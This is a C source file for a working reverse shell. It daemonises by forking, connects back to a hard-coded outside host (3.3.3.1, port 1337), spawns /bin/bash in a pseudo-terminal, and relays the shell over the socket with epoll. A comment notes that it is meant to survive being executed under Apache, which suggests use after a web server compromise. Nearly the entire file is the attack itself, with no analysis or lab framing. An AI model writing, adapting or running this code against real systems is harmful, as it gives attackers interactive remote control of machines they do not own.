//#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/types.h>   //old UNIX flag must be add sys/types.h before /sys header files
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <string.h>
#include <pty.h>
#include <utmp.h>
#include <errno.h>
#include <netdb.h>

#define MAXBUF 524288

int createConnect(char *host, u_short port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in s;
    memset(&s, 0, sizeof(s));
    s.sin_family = AF_INET;
    s.sin_port = htons(port);
    
    // 尝试直接转换IP地址
    if (inet_aton(host, &s.sin_addr) == 0) {
        // 域名解析
        struct hostent *he = gethostbyname(host);
        if (he == NULL || he->h_addrtype != AF_INET) {
            close(sock);
            return -1;
        }
        memcpy(&s.sin_addr, he->h_addr_list[0], he->h_length);
    }
    
    if (connect(sock, (struct sockaddr *)&s, sizeof(s)) == 0) {
        return sock;
    }
    
    close(sock);
    return -1;
}

int swapData(int sockfd, int master) {
	int epfd, nfds, nb;
	struct epoll_event ev[2], events[5];
	unsigned char buf[MAXBUF];
	
	epfd = epoll_create(2);
	ev[0].data.fd = sockfd;
	ev[0].events = EPOLLIN | EPOLLET;
	epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &ev[0]);
	
	ev[1].data.fd = master;
	ev[1].events = EPOLLIN | EPOLLET;
	epoll_ctl(epfd, EPOLL_CTL_ADD, master, &ev[1]);
	
	for(;;) {
		nfds = epoll_wait(epfd, events, 5, -1);
		for(int i = 0;i < nfds; i ++) {
			if(events[i].data.fd == sockfd) {
				nb = read(sockfd, buf, MAXBUF);
				if(!nb) goto __LABEL_EXIT;
				write(master, buf, nb);
			}
			if(events[i].data.fd == master) {
				nb = read(master, buf, MAXBUF);
				if(!nb) goto __LABEL_EXIT;
				write(sockfd, buf, nb);
			}
		}
	}
	__LABEL_EXIT:
		close(sockfd);
		close(master);
		close(epfd);
	
	return 0;
}

void sig_child(int signo) {
	int status;
	pid_t pid = wait(&status);
	exit(0);
}

int main(int argc, char* argv[]) {
	char ptsname[32] = {0};
	pid_t pid  = -1; 
	int master = -1;
	u_short port  = 1337;
	char* host  = "3.3.3.1";
	int sockfd = -1;
		
	//fork child process, no hung
	pid = fork();
	if(pid == -1) return 0;
	if(pid > 0) return 0;

	//connection back with tcp
	if((sockfd = createConnect(host, port)) == -1) return 0;
	
	//setup handler for SIGCHLD
	signal(SIGCHLD, sig_child);
	
	//fork and open pty
	pid = forkpty(&master, ptsname, NULL, NULL);
	
	//child open bash shell
	if(pid == 0) execlp("/bin/bash", "/bin/bash", NULL);

	//dup2 stdin/stdout/stderr to sockfd, it's will hung executed by apache if not do this step
	for(int i = 0;i < 3; i ++)
		dup2(sockfd, i);
	//parent swapData data
	swapData(sockfd, master);

	return 0;
}